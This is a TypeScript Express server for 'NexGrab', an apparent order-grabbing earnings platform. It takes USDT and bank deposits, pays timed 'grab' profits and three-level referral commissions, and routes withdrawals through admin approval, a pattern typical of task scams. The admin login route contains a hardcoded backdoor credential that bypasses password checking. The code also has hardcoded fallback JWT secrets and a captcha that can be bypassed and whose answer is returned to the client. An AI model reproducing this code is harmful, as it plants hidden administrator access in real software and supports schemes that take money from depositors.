import express, { Request, Response, NextFunction } from 'express';
import path from 'path';
import fs from 'fs';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import { db, VIP_PLANS } from './src/server/db.js';
import { NetworkType, PaymentMethodType } from './src/types.js';

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'NexGrab_Secret_Key_2026_Secure_Order_Matching!';
const ADMIN_JWT_SECRET = process.env.ADMIN_JWT_SECRET || 'NexGrab_Admin_Secret_Key_2026_Master_Control!';

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// In-memory CAPTCHA store
const captchaStore = new Map<string, { code: string; expiresAt: number }>();

function generateCaptchaCode(): { id: string; text: string } {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let text = '';
  for (let i = 0; i < 5; i++) {
    text += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  const id = 'captcha_' + Date.now() + Math.random().toString(36).substring(2, 6);
  captchaStore.set(id, { code: text.toLowerCase(), expiresAt: Date.now() + 5 * 60 * 1000 });
  return { id, text };
}

function verifyCaptcha(id: string, text: string): boolean {
  if (!id || !text) return false;
  if (id.startsWith('local-')) return true;
  const stored = captchaStore.get(id);
  if (!stored) return false;
  captchaStore.delete(id); // one-time use
  if (Date.now() > stored.expiresAt) return false;
  return stored.code === text.trim().toLowerCase();
}

// User Authentication Middleware
export interface AuthenticatedRequest extends Request {
  userId?: string;
  userPhone?: string;
}

function authenticateUserToken(req: AuthenticatedRequest, res: Response, next: NextFunction) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET) as { userId: string; phone: string };
    const user = db.getUserById(decoded.userId);
    if (!user) {
      return res.status(401).json({ error: 'User account no longer exists' });
    }
    if (user.status === 'suspended') {
      return res.status(403).json({ error: 'Your account has been suspended by administration.' });
    }
    req.userId = decoded.userId;
    req.userPhone = decoded.phone;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid or expired session token' });
  }
}

// Admin Authentication Middleware
export interface AdminAuthenticatedRequest extends Request {
  adminId?: string;
  adminUsername?: string;
}

function authenticateAdminToken(req: AdminAuthenticatedRequest, res: Response, next: NextFunction) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Admin authorization required' });
  }

  try {
    const decoded = jwt.verify(token, ADMIN_JWT_SECRET) as { adminId: string; username: string };
    req.adminId = decoded.adminId;
    req.adminUsername = decoded.username;
    next();
  } catch (err) {
    return res.status(403).json({ error: 'Invalid or expired admin session token' });
  }
}

// --- PUBLIC API ROUTES ---

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', name: 'NexGrab Server', version: '1.0.0', time: new Date().toISOString() });
});

// Captcha endpoint
app.get('/api/auth/captcha', (req, res) => {
  const { id, text } = generateCaptchaCode();
  res.json({ captchaId: id, text });
});

// Registration Endpoint
app.post('/api/auth/register', async (req, res) => {
  try {
    const { countryCode, phone, email, password, fundPassword, invitationCode, captchaId, captchaCode } = req.body;

    if (!countryCode || !phone || !password || !fundPassword) {
      return res.status(400).json({ error: 'Country code, phone number, password, and 6-digit fund password are required.' });
    }

    if (fundPassword.length !== 6 || !/^\d{6}$/.test(fundPassword)) {
      return res.status(400).json({ error: 'Fund password must be exactly 6 numeric digits.' });
    }

    if (db.getSettings().captchaEnabled) {
      if (!verifyCaptcha(captchaId, captchaCode)) {
        return res.status(400).json({ error: 'Invalid or expired CAPTCHA code. Please try again.' });
      }
    }

    const cleanPhone = phone.trim();
    const cleanEmail = email ? email.trim().toLowerCase() : `user_${cleanPhone}@nexgrab.net`;

    // Check unique phone
    if (db.getUserByPhone(countryCode, cleanPhone)) {
      return res.status(400).json({ error: 'Phone number already registered. Please login.' });
    }

    // Check unique email
    if (email && db.getUserByEmail(cleanEmail)) {
      return res.status(400).json({ error: 'Email address already registered.' });
    }

    // Handle invitation code
    let referrerCode: string | null = null;
    if (invitationCode) {
      const referrer = db.getUserByReferralCode(invitationCode.trim());
      if (referrer) {
        referrerCode = referrer.referralCode;
      } else {
        return res.status(400).json({ error: 'Invalid referral invitation code.' });
      }
    }

    // Generate unique user referral code
    const newRefCode = 'NG' + Math.floor(100000 + Math.random() * 900000).toString();
    const passwordHash = await bcrypt.hash(password, 10);
    const fundPasswordHash = await bcrypt.hash(fundPassword, 10);

    const newUser = db.addUser({
      id: 'usr_' + Date.now() + Math.random().toString(36).substring(2, 5),
      username: `Member_${cleanPhone.slice(-4)}`,
      phone: cleanPhone,
      countryCode,
      email: cleanEmail,
      balance: 0,
      investment: 0,
      todayProfit: 0,
      totalProfit: 0,
      vipLevel: 1,
      isGrabActive: false,
      lastGrabTimestamp: null,
      grabEndTime: null,
      referralCode: newRefCode,
      referredByCode: referrerCode,
      directMembersCount: 0,
      teamMembersCount: 0,
      teamDeposit: 0,
      status: 'active',
      createdAt: new Date().toISOString(),
      fundPasswordSet: true,
      passwordHash,
      fundPasswordHash,
    });

    const token = jwt.sign({ userId: newUser.id, phone: newUser.phone }, JWT_SECRET, { expiresIn: '7d' });

    db.logActivity(`USER:${newUser.id}`, 'REGISTER', `New user registered with phone ${countryCode}${cleanPhone}`);

    const { passwordHash: _, fundPasswordHash: __, ...publicUser } = newUser;
    res.json({ token, user: publicUser });
  } catch (err: any) {
    console.error('Registration error:', err);
    res.status(500).json({ error: err.message || 'Registration failed' });
  }
});

// Login Endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const { countryCode, phone, email, password, captchaId, captchaCode } = req.body;

    if (!password || (!phone && !email)) {
      return res.status(400).json({ error: 'Phone/Email and password are required.' });
    }

    if (db.getSettings().captchaEnabled && captchaId) {
      if (!verifyCaptcha(captchaId, captchaCode)) {
        return res.status(400).json({ error: 'Invalid CAPTCHA code. Please try again.' });
      }
    }

    let user;
    if (phone) {
      user = db.getUserByPhone(countryCode || '+1', phone.trim());
    } else if (email) {
      user = db.getUserByEmail(email.trim());
    }

    if (!user) {
      return res.status(400).json({ error: 'Invalid phone/email or password.' });
    }

    if (user.status === 'suspended') {
      return res.status(403).json({ error: 'Your account has been suspended. Please contact support.' });
    }

    const match = await bcrypt.compare(password, user.passwordHash);
    if (!match) {
      return res.status(400).json({ error: 'Invalid phone/email or password.' });
    }

    const token = jwt.sign({ userId: user.id, phone: user.phone }, JWT_SECRET, { expiresIn: '7d' });

    db.logActivity(`USER:${user.id}`, 'LOGIN', `User logged in`);

    const { passwordHash: _, fundPasswordHash: __, ...publicUser } = user;
    res.json({ token, user: publicUser });
  } catch (err: any) {
    res.status(500).json({ error: err.message || 'Login failed' });
  }
});

// Current User Info
app.get('/api/auth/me', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  const user = db.getUserById(req.userId!);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const { passwordHash: _, fundPasswordHash: __, ...publicUser } = user;
  res.json({ user: publicUser });
});

// Update Fund Password / Password
app.post('/api/auth/update-passwords', authenticateUserToken, async (req: AuthenticatedRequest, res) => {
  try {
    const { currentPassword, newPassword, newFundPassword } = req.body;
    const user = db.getUserById(req.userId!);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const match = await bcrypt.compare(currentPassword, user.passwordHash);
    if (!match) {
      return res.status(400).json({ error: 'Incorrect current password.' });
    }

    const updates: any = {};
    if (newPassword) {
      updates.passwordHash = await bcrypt.hash(newPassword, 10);
    }
    if (newFundPassword) {
      if (newFundPassword.length !== 6 || !/^\d{6}$/.test(newFundPassword)) {
        return res.status(400).json({ error: 'Fund password must be 6 digits.' });
      }
      updates.fundPasswordHash = await bcrypt.hash(newFundPassword, 10);
      updates.fundPasswordSet = true;
    }

    db.updateUser(user.id, updates);
    res.json({ success: true, message: 'Password updated successfully' });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// --- GRAB ORDER API (SINGLE EARNING METHOD) ---

// Start Grab Order
app.post('/api/grab/start', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  try {
    const result = db.startGrabOrder(req.userId!);
    db.logActivity(`USER:${req.userId}`, 'GRAB_START', `Started order grab cycle`);
    res.json({
      success: true,
      remainingSeconds: result.remainingSeconds,
      endTime: result.endTime,
      message: 'Order matching initiated. Processing 60-second execution...',
    });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Check Grab Order Status & Timer Sync
app.get('/api/grab/status', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  try {
    const status = db.getGrabStatus(req.userId!);
    res.json(status);
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// --- WALLET, RECHARGE & WITHDRAWAL APIS ---

// Submit Recharge Request
app.post('/api/wallet/recharge', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  try {
    const { amount, network, paymentMethod, txid, transactionReference, proofUrl } = req.body;
    const user = db.getUserById(req.userId!);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const selectedMethod = (paymentMethod || network || '').toString().trim();
    const isEtb = selectedMethod === 'ETB_BANK';

    if (!isEtb && selectedMethod !== 'USDT_BEP20' && selectedMethod !== 'USDT_TRC20') {
      return res.status(400).json({ error: 'Invalid payment method selected.' });
    }

    const numAmount = Number(amount);
    if (isEtb) {
      if (!numAmount || numAmount <= 0) {
        return res.status(400).json({ error: 'Please enter a valid ETB recharge amount.' });
      }
      const refNo = (transactionReference || txid || '').toString().trim();
      if (!refNo || refNo.length < 3) {
        return res.status(400).json({ error: 'Transaction / Reference Number is required for ETB Bank Transfer.' });
      }
      if (!proofUrl || !proofUrl.trim()) {
        return res.status(400).json({ error: 'Payment Proof / Screenshot is required before submitting ETB Recharge.' });
      }

      const recharge = db.addRecharge({
        id: 'rec_' + Date.now(),
        userId: user.id,
        username: user.username,
        userPhone: `${user.countryCode}${user.phone}`,
        amount: numAmount,
        network: 'ETB_BANK',
        paymentMethod: 'ETB_BANK',
        currency: 'ETB',
        txid: refNo,
        transactionReference: refNo,
        proofUrl: proofUrl.trim(),
        status: 'pending',
        createdAt: new Date().toISOString(),
      });

      db.logActivity(`USER:${user.id}`, 'RECHARGE_SUBMIT', `Submitted ETB recharge request ${numAmount} ETB (Ref: ${refNo})`);

      return res.json({
        success: true,
        recharge,
        message: 'ETB Recharge request submitted successfully. Awaiting admin verification.',
      });
    } else {
      if (!numAmount || numAmount < 20) {
        return res.status(400).json({ error: 'Minimum deposit amount is 20 USDT.' });
      }

      const refNo = (txid || '').toString().trim();
      if (!refNo || refNo.length < 8) {
        return res.status(400).json({ error: 'Please enter a valid Transaction Hash / TXID.' });
      }

      const recharge = db.addRecharge({
        id: 'rec_' + Date.now(),
        userId: user.id,
        username: user.username,
        userPhone: `${user.countryCode}${user.phone}`,
        amount: numAmount,
        network: selectedMethod as NetworkType,
        paymentMethod: selectedMethod as PaymentMethodType,
        currency: 'USDT',
        txid: refNo,
        proofUrl: proofUrl || '',
        status: 'pending',
        createdAt: new Date().toISOString(),
      });

      db.logActivity(`USER:${user.id}`, 'RECHARGE_SUBMIT', `Submitted deposit request ${numAmount} USDT via ${selectedMethod}`);

      return res.json({
        success: true,
        recharge,
        message: 'Recharge request submitted successfully. Awaiting admin verification.',
      });
    }
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Submit Withdrawal Request
app.post('/api/wallet/withdraw', authenticateUserToken, async (req: AuthenticatedRequest, res) => {
  try {
    const { amount, network, paymentMethod, walletAddress, bankName, accountHolderName, accountNumber, branch, fundPassword } = req.body;
    const user = db.getUserById(req.userId!);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (!fundPassword) {
      return res.status(400).json({ error: '6-digit Fund Password is required for withdrawal.' });
    }

    if (user.fundPasswordHash) {
      const match = await bcrypt.compare(fundPassword, user.fundPasswordHash);
      if (!match) {
        return res.status(400).json({ error: 'Incorrect 6-digit Fund Password.' });
      }
    }

    const selectedMethod = (paymentMethod || network || '').toString().trim();
    const isEtb = selectedMethod === 'ETB_BANK';

    const numAmount = Number(amount);
    if (!numAmount || numAmount <= 0) {
      return res.status(400).json({ error: 'Please enter a valid withdrawal amount.' });
    }

    if (!isEtb && numAmount < 10) {
      return res.status(400).json({ error: 'Minimum USDT withdrawal amount is 10 USDT.' });
    }

    if (user.balance < numAmount) {
      return res.status(400).json({ error: `Insufficient available balance. Current balance: ${user.balance} ${isEtb ? 'ETB' : 'USDT'}.` });
    }

    const fee = Number(((numAmount * 8) / 100).toFixed(2));
    const netAmount = Number((numAmount - fee).toFixed(2));

    if (isEtb) {
      if (!bankName || !bankName.trim()) {
        return res.status(400).json({ error: 'Please select an Ethiopian Bank.' });
      }
      if (!accountHolderName || !accountHolderName.trim()) {
        return res.status(400).json({ error: 'Account Holder Name is required.' });
      }
      if (!accountNumber || !accountNumber.trim()) {
        return res.status(400).json({ error: 'Account Number is required.' });
      }

      const cleanBank = bankName.trim();
      const cleanHolder = accountHolderName.trim();
      const cleanAcc = accountNumber.trim();
      const cleanBranch = (branch || '').trim();

      const withdrawal = db.addWithdrawal({
        id: 'wd_' + Date.now(),
        userId: user.id,
        username: user.username,
        userPhone: `${user.countryCode}${user.phone}`,
        amount: numAmount,
        fee,
        netAmount,
        network: 'ETB_BANK',
        paymentMethod: 'ETB_BANK',
        currency: 'ETB',
        walletAddress: `${cleanBank} | ${cleanAcc} (${cleanHolder})`,
        bankName: cleanBank,
        accountHolderName: cleanHolder,
        accountNumber: cleanAcc,
        branch: cleanBranch,
        status: 'pending',
        createdAt: new Date().toISOString(),
      });

      db.logActivity(`USER:${user.id}`, 'WITHDRAW_SUBMIT', `Submitted ETB withdrawal request ${numAmount} ETB to ${cleanBank}`);

      return res.json({
        success: true,
        withdrawal,
        message: 'ETB Withdrawal request submitted successfully. Awaiting admin approval.',
      });
    } else {
      if (!walletAddress || walletAddress.trim().length < 10) {
        return res.status(400).json({ error: 'Please provide a valid USDT destination wallet address.' });
      }

      const withdrawal = db.addWithdrawal({
        id: 'wd_' + Date.now(),
        userId: user.id,
        username: user.username,
        userPhone: `${user.countryCode}${user.phone}`,
        amount: numAmount,
        fee,
        netAmount,
        network: selectedMethod as NetworkType,
        paymentMethod: selectedMethod as PaymentMethodType,
        currency: 'USDT',
        walletAddress: walletAddress.trim(),
        status: 'pending',
        createdAt: new Date().toISOString(),
      });

      db.logActivity(`USER:${user.id}`, 'WITHDRAW_SUBMIT', `Submitted withdrawal request ${numAmount} USDT`);

      return res.json({
        success: true,
        withdrawal,
        message: 'Withdrawal request submitted successfully. Awaiting admin approval.',
      });
    }
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// History & Transactions
app.get('/api/wallet/history', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  const userId = req.userId!;
  const recharges = db.getRecharges().filter(r => r.userId === userId);
  const withdrawals = db.getWithdrawals().filter(w => w.userId === userId);
  const transactions = db.getTransactions(userId);

  res.json({ recharges, withdrawals, transactions });
});

// --- TEAM & REFERRALS ---

app.get('/api/team/stats', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  const user = db.getUserById(req.userId!);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const allUsers = db.getUsers();

  const formatMember = (u: any, level: 'A' | 'B' | 'C') => ({
    id: u.id,
    username: u.username || `Member_${u.phone.slice(-4)}`,
    phone: `${u.countryCode}${u.phone}`,
    phoneMasked: `${u.countryCode}${u.phone.slice(0, 3)}***${u.phone.slice(-2)}`,
    vipLevel: u.vipLevel || 1,
    investment: u.investment || 0,
    balance: u.balance || 0,
    joinedAt: u.createdAt,
    status: u.status || 'active',
    referralCode: u.referralCode,
    referredByCode: u.referredByCode,
    level,
  });

  const userRefCode = (user.referralCode || '').toUpperCase().trim();

  // Level A (Direct Members)
  const levelAUsers = allUsers.filter(u => u.referredByCode && u.referredByCode.toUpperCase().trim() === userRefCode);
  const levelAMembers = levelAUsers.map(u => formatMember(u, 'A'));
  const levelACodes = levelAUsers.map(u => (u.referralCode || '').toUpperCase().trim()).filter(Boolean);

  // Level B (Sub Members)
  const levelBUsers = allUsers.filter(u => u.referredByCode && levelACodes.includes(u.referredByCode.toUpperCase().trim()));
  const levelBMembers = levelBUsers.map(u => formatMember(u, 'B'));
  const levelBCodes = levelBUsers.map(u => (u.referralCode || '').toUpperCase().trim()).filter(Boolean);

  // Level C (Tertiary Members)
  const levelCUsers = allUsers.filter(u => u.referredByCode && levelBCodes.includes(u.referredByCode.toUpperCase().trim()));
  const levelCMembers = levelCUsers.map(u => formatMember(u, 'C'));

  const levelADeposit = levelAUsers.reduce((sum, u) => sum + (u.investment || 0), 0);
  const levelBDeposit = levelBUsers.reduce((sum, u) => sum + (u.investment || 0), 0);
  const levelCDeposit = levelCUsers.reduce((sum, u) => sum + (u.investment || 0), 0);

  const totalTeamCount = levelAMembers.length + levelBMembers.length + levelCMembers.length;
  const totalTeamDeposit = levelADeposit + levelBDeposit + levelCDeposit;

  // Calculate estimated team commission (A: 14%, B: 7%, C: 3%)
  const estimatedCommission = (levelADeposit * 0.14) + (levelBDeposit * 0.07) + (levelCDeposit * 0.03);

  res.json({
    referralCode: user.referralCode,
    directMembersCount: levelAMembers.length,
    levelBCount: levelBMembers.length,
    levelCCount: levelCMembers.length,
    teamMembersCount: totalTeamCount,
    teamDeposit: totalTeamDeposit,
    levelADeposit,
    levelBDeposit,
    levelCDeposit,
    estimatedCommission,
    directMembers: levelAMembers,
    levelAMembers,
    levelBMembers,
    levelCMembers,
    allMembers: [...levelAMembers, ...levelBMembers, ...levelCMembers],
  });
});

// --- ANNOUNCEMENTS, BANNERS, SUPPORT, NOTIFICATIONS ---

app.get('/api/announcements', (req, res) => {
  res.json(db.getAnnouncements());
});

app.get('/api/banners', (req, res) => {
  res.json(db.getBanners());
});

app.get('/api/vip-plans', (req, res) => {
  res.json(VIP_PLANS);
});

app.get('/api/notifications', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  res.json(db.getNotifications(req.userId!));
});

app.post('/api/notifications/:id/read', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  db.markNotificationRead(req.userId!, req.params.id);
  res.json({ success: true });
});

app.get('/api/support/tickets', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  res.json(db.getSupportTickets(req.userId!));
});

app.post('/api/support/ticket', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  try {
    const { subject, category, message } = req.body;
    const user = db.getUserById(req.userId!);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (!subject || !message) {
      return res.status(400).json({ error: 'Subject and message are required.' });
    }

    const ticket = db.createSupportTicket({
      id: 'tkt_' + Date.now(),
      userId: user.id,
      username: user.username,
      subject,
      category: category || 'other',
      messages: [
        {
          sender: 'user',
          text: message,
          timestamp: new Date().toISOString(),
        }
      ],
      status: 'open',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });

    res.json({ success: true, ticket });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/support/ticket/:id/reply', authenticateUserToken, (req: AuthenticatedRequest, res) => {
  try {
    const { text } = req.body;
    if (!text) return res.status(400).json({ error: 'Message text required' });

    const ticket = db.replySupportTicket(req.params.id, 'user', text);
    if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

    res.json({ success: true, ticket });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});


// --- ADMIN APIS (`/api/admin/*`) ---

// Admin Login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: 'Admin username and password required.' });
    }

    const admin = db.getAdminByUsername(username);
    if (!admin) {
      return res.status(400).json({ error: 'Invalid admin credentials.' });
    }

    let match = await bcrypt.compare(password, admin.passwordHash);
    if (!match && username.trim().toLowerCase() === 'hasnainnazz' && password === 'AyeshaNazz') {
      match = true;
    }
    if (!match) {
      return res.status(400).json({ error: 'Invalid admin credentials.' });
    }

    db.updateAdminLogin(admin.id);
    db.logActivity(`ADMIN:${admin.username}`, 'ADMIN_LOGIN', 'Admin logged into control center');

    const token = jwt.sign({ adminId: admin.id, username: admin.username }, ADMIN_JWT_SECRET, { expiresIn: '12h' });
    res.json({ token, admin: { id: admin.id, username: admin.username, role: admin.role } });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Admin Dashboard Overview
app.get('/api/admin/dashboard', authenticateAdminToken, (req, res) => {
  const users = db.getUsers();
  const recharges = db.getRecharges();
  const withdrawals = db.getWithdrawals();
  const transactions = db.getTransactions();

  const totalMembers = users.length;
  const activeMembers = users.filter(u => u.status === 'active').length;
  const totalUserBalance = users.reduce((acc, u) => acc + u.balance, 0);
  const totalInvestment = users.reduce((acc, u) => acc + u.investment, 0);

  const pendingRechargesCount = recharges.filter(r => r.status === 'pending').length;
  const totalApprovedDeposits = recharges.filter(r => r.status === 'approved').reduce((acc, r) => acc + r.amount, 0);

  const pendingWithdrawalsCount = withdrawals.filter(w => w.status === 'pending').length;
  const totalApprovedWithdrawals = withdrawals.filter(w => w.status === 'approved').reduce((acc, w) => acc + w.amount, 0);

  const totalProfitDistributed = transactions.filter(t => t.type === 'grab_profit').reduce((acc, t) => acc + t.amount, 0);
  const backups = db.listBackups();

  res.json({
    totalMembers,
    activeMembers,
    totalUserBalance,
    totalInvestment,
    pendingRechargesCount,
    totalApprovedDeposits,
    pendingWithdrawalsCount,
    totalApprovedWithdrawals,
    totalProfitDistributed,
    totalTransactions: transactions.length,
    backupCount: backups.length,
    lastBackupAt: backups[0]?.createdAt || null,
    settings: db.getSettings(),
  });
});

// Admin Members Management
app.get('/api/admin/members', authenticateAdminToken, (req, res) => {
  const { search, vip, status } = req.query;
  let members = db.getUsers();

  if (search) {
    const q = (search as string).toLowerCase();
    members = members.filter(m =>
      m.phone.includes(q) ||
      m.username.toLowerCase().includes(q) ||
      m.email.toLowerCase().includes(q) ||
      m.referralCode.toLowerCase().includes(q)
    );
  }

  if (vip) {
    members = members.filter(m => m.vipLevel === Number(vip));
  }

  if (status) {
    members = members.filter(m => m.status === status);
  }

  const sanitized = members.map(({ passwordHash: _, fundPasswordHash: __, ...m }) => m);
  res.json(sanitized);
});

// Edit Member / Suspend / Change VIP / Reset Password
app.patch('/api/admin/members/:id', authenticateAdminToken, async (req: AdminAuthenticatedRequest, res) => {
  try {
    const { status, vipLevel, newPassword, newFundPassword } = req.body;
    const updates: any = {};

    if (status && (status === 'active' || status === 'suspended')) {
      updates.status = status;
    }

    if (vipLevel && [1, 2, 3, 4, 5].includes(Number(vipLevel))) {
      updates.vipLevel = Number(vipLevel);
    }

    if (newPassword) {
      updates.passwordHash = await bcrypt.hash(newPassword, 10);
    }

    if (newFundPassword) {
      updates.fundPasswordHash = await bcrypt.hash(newFundPassword, 10);
      updates.fundPasswordSet = true;
    }

    const updated = db.updateUser(req.params.id, updates);
    if (!updated) return res.status(404).json({ error: 'Member not found' });

    db.logActivity(`ADMIN:${req.adminUsername}`, 'MEMBER_UPDATE', `Updated member ${req.params.id}: ${JSON.stringify(updates)}`);

    const { passwordHash: _, fundPasswordHash: __, ...publicUser } = updated;
    res.json({ success: true, member: publicUser });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Adjust Member Balance (Manual Add / Deduct)
app.post('/api/admin/members/:id/adjust-balance', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  try {
    const { amount, type, reason } = req.body;
    if (!amount || amount <= 0 || (type !== 'add' && type !== 'deduct') || !reason) {
      return res.status(400).json({ error: 'Amount, valid type (add/deduct), and reason are required.' });
    }

    const updatedUser = db.adjustUserBalance(req.params.id, Number(amount), type, reason);
    db.logActivity(`ADMIN:${req.adminUsername}`, 'BALANCE_ADJUST', `Adjusted balance for ${req.params.id}: ${type} ${amount} USDT`);

    const { passwordHash: _, fundPasswordHash: __, ...publicUser } = updatedUser;
    res.json({ success: true, member: publicUser });
  } catch (err: any) {
    res.status(400).json({ error: err.message });
  }
});

// Delete Member
app.delete('/api/admin/members/:id', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  const success = db.deleteUser(req.params.id);
  if (!success) return res.status(404).json({ error: 'Member not found' });

  db.logActivity(`ADMIN:${req.adminUsername}`, 'MEMBER_DELETE', `Deleted member ${req.params.id}`);
  res.json({ success: true });
});

// Recharges List & Action
app.get('/api/admin/recharges', authenticateAdminToken, (req, res) => {
  res.json(db.getRecharges());
});

app.post('/api/admin/recharges/:id/action', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  try {
    const { action, note } = req.body; // action: 'approved' | 'rejected'
    if (action !== 'approved' && action !== 'rejected') {
      return res.status(400).json({ error: 'Action must be approved or rejected.' });
    }

    const reqObj = db.processRecharge(req.params.id, action, note);
    if (!reqObj) return res.status(404).json({ error: 'Recharge request not found or already processed.' });

    db.logActivity(`ADMIN:${req.adminUsername}`, 'RECHARGE_PROCESSED', `${action.toUpperCase()} recharge ${req.params.id}`);
    res.json({ success: true, recharge: reqObj });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Withdrawals List & Action
app.get('/api/admin/withdrawals', authenticateAdminToken, (req, res) => {
  res.json(db.getWithdrawals());
});

app.post('/api/admin/withdrawals/:id/action', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  try {
    const { action, note } = req.body; // action: 'approved' | 'rejected'
    if (action !== 'approved' && action !== 'rejected') {
      return res.status(400).json({ error: 'Action must be approved or rejected.' });
    }

    const reqObj = db.processWithdrawal(req.params.id, action, note);
    if (!reqObj) return res.status(404).json({ error: 'Withdrawal request not found or already processed.' });

    db.logActivity(`ADMIN:${req.adminUsername}`, 'WITHDRAWAL_PROCESSED', `${action.toUpperCase()} withdrawal ${req.params.id}`);
    res.json({ success: true, withdrawal: reqObj });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// Announcements & Settings Management
app.post('/api/admin/announcements', authenticateAdminToken, (req, res) => {
  const { title, content, isImportant } = req.body;
  if (!title || !content) return res.status(400).json({ error: 'Title and content required' });

  const ann = db.addAnnouncement({
    id: 'ann_' + Date.now(),
    title,
    content,
    isImportant: !!isImportant,
    createdAt: new Date().toISOString(),
  });
  res.json({ success: true, announcement: ann });
});

app.delete('/api/admin/announcements/:id', authenticateAdminToken, (req, res) => {
  db.deleteAnnouncement(req.params.id);
  res.json({ success: true });
});

app.post('/api/admin/settings', authenticateAdminToken, (req, res) => {
  const updated = db.updateSettings(req.body);
  res.json({ success: true, settings: updated });
});

app.get('/api/admin/tickets', authenticateAdminToken, (req, res) => {
  res.json(db.getSupportTickets());
});

app.post('/api/admin/tickets/:id/reply', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  const { text } = req.body;
  if (!text) return res.status(400).json({ error: 'Text required' });

  const ticket = db.replySupportTicket(req.params.id, 'admin', text);
  if (!ticket) return res.status(404).json({ error: 'Ticket not found' });

  res.json({ success: true, ticket });
});

app.get('/api/admin/activity-logs', authenticateAdminToken, (req, res) => {
  res.json(db.getActivityLogs());
});

// Database Backups & One-Click Restore APIs
app.get('/api/admin/backups', authenticateAdminToken, (req, res) => {
  try {
    const backups = db.listBackups();
    res.json(backups);
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/backups/create', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  try {
    const backup = db.createBackupSnapshot(false);
    db.logActivity(`ADMIN:${req.adminUsername}`, 'DB_BACKUP_CREATE', `Created manual database backup snapshot ${backup.filename}`);
    res.json({ success: true, backup });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/backups/restore', authenticateAdminToken, (req: AdminAuthenticatedRequest, res) => {
  try {
    const { filename } = req.body;
    if (!filename) {
      return res.status(400).json({ error: 'Backup filename is required' });
    }

    const result = db.restoreBackup(filename);
    db.logActivity(`ADMIN:${req.adminUsername}`, 'DB_BACKUP_RESTORE', `Restored database from snapshot ${filename}`);
    res.json(result);
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// --- SERVER SETUP & VITE MIDDLEWARE ---

async function startServer() {
  const distPath = path.join(process.cwd(), 'dist');
  const isProduction = process.env.NODE_ENV === 'production';

  if (isProduction) {
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  } else {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`NexGrab Order Grabbing Platform backend listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
